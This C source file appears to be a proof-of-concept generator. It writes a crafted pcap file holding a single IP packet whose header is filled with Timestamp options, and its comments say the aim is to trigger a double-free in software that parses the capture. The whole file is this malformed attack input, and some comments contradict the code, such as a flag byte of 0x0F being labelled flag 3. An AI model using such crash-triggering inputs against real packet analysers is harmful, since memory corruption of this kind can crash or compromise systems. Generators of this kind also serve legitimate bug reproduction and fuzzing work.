#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Pcap global header (24 bytes) - big endian */
    unsigned char pcap_global[] = {
        0xa1, 0xb2, 0xc3, 0xd4, /* magic number */
        0x00, 0x02,             /* version major = 2 */
        0x00, 0x04,             /* version minor = 4 */
        0x00, 0x00, 0x00, 0x00, /* timezone = 0 */
        0x00, 0x00, 0x00, 0x00, /* sigfigs = 0 */
        0x00, 0x00, 0xff, 0xff, /* snaplen = 65535 */
        0x00, 0x00, 0x00, 0x65  /* link type = RAW IP (101) */
    };
    fwrite(pcap_global, 1, 24, f);

    /* Craft IP packet with Timestamp options to trigger double-free */
    int ip_options_len = 40;  /* maximum options length */
    int ip_header_len = 20 + ip_options_len; /* 60 bytes */
    int total_len = ip_header_len; /* no payload */

    /* Pcap packet header (16 bytes) */
    unsigned char pcap_packet[] = {
        0x00, 0x00, 0x00, 0x00, /* timestamp seconds = 0 */
        0x00, 0x00, 0x00, 0x00, /* timestamp microseconds = 0 */
        (total_len >> 24) & 0xff, (total_len >> 16) & 0xff,
        (total_len >> 8) & 0xff, total_len & 0xff, /* captured length */
        (total_len >> 24) & 0xff, (total_len >> 16) & 0xff,
        (total_len >> 8) & 0xff, total_len & 0xff  /* original length */
    };
    fwrite(pcap_packet, 1, 16, f);

    /* Build full IP header (20 bytes base + 40 bytes options) */
    unsigned char ip_packet[60];
    memset(ip_packet, 0, 60);

    /* Base IP header (20 bytes) */
    ip_packet[0] = 0x4F;          /* version 4, IHL=15 (60 bytes header) */
    ip_packet[1] = 0x00;          /* ToS */
    ip_packet[2] = (total_len >> 8) & 0xff; /* total length */
    ip_packet[3] = total_len & 0xff;
    ip_packet[4] = 0x00;          /* identification */
    ip_packet[5] = 0x00;
    ip_packet[6] = 0x00;          /* flags + fragment offset */
    ip_packet[7] = 0x00;
    ip_packet[8] = 0x40;          /* TTL */
    ip_packet[9] = 0x01;          /* ICMP protocol */
    ip_packet[10] = 0x00;         /* checksum (will compute) */
    ip_packet[11] = 0x00;
    ip_packet[12] = 10;           /* src IP = 10.0.0.1 */
    ip_packet[13] = 0;
    ip_packet[14] = 0;
    ip_packet[15] = 1;
    ip_packet[16] = 10;           /* dst IP = 10.0.0.2 */
    ip_packet[17] = 0;
    ip_packet[18] = 0;
    ip_packet[19] = 2;

    /* IP options: 40 bytes of Timestamp (type 0x44) with multiple timestamps */
    /* Option format: type(1), length(1), pointer(1), overflow(4bits)-flag(4bits), timestamps... */
    /* Each timestamp entry is 8 bytes (4 bytes IP + 4 bytes timestamp) */
    /* We'll create 4 timestamp entries (4 * 8 = 32 bytes) plus header (4 bytes) = 36 bytes */
    /* Pad remaining 4 bytes with NOP (type 0x01) */
    int offset = 20; /* start of options in packet */
    /* First option: Timestamp */
    ip_packet[offset] = 0x44;     /* option type: Timestamp */
    ip_packet[offset+1] = 36;     /* option length */
    ip_packet[offset+2] = 5;      /* pointer (points to first empty slot) */
    ip_packet[offset+3] = 0x0F;   /* overflow=0, flag=3 (timestamp and IP address) */
    /* 4 timestamp entries (8 bytes each) */
    for (int i = 0; i < 4; i++) {
        int ts_offset = offset + 4 + i * 8;
        ip_packet[ts_offset] = 10;     /* IP address byte 1 */
        ip_packet[ts_offset+1] = 0;    /* IP address byte 2 */
        ip_packet[ts_offset+2] = 0;    /* IP address byte 3 */
        ip_packet[ts_offset+3] = 1;    /* IP address byte 4 */
        ip_packet[ts_offset+4] = 0;    /* timestamp (big endian) */
        ip_packet[ts_offset+5] = 0;
        ip_packet[ts_offset+6] = 0;
        ip_packet[ts_offset+7] = i;    /* timestamp value */
    }
    /* Pad with NOP options */
    offset += 36;
    while (offset < 60) {
        ip_packet[offset] = 0x01; /* NOP */
        offset++;
    }

    /* Compute IP checksum over full 60 bytes */
    unsigned int sum = 0;
    for (int i = 0; i < 60; i += 2) {
        sum += (ip_packet[i] << 8) | ip_packet[i+1];
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    unsigned short checksum = ~((unsigned short)sum);
    ip_packet[10] = (checksum >> 8) & 0xFF;
    ip_packet[11] = checksum & 0xFF;

    /* Write the entire IP packet */
    fwrite(ip_packet, 1, 60, f);

    fclose(f);
    return 0;
}

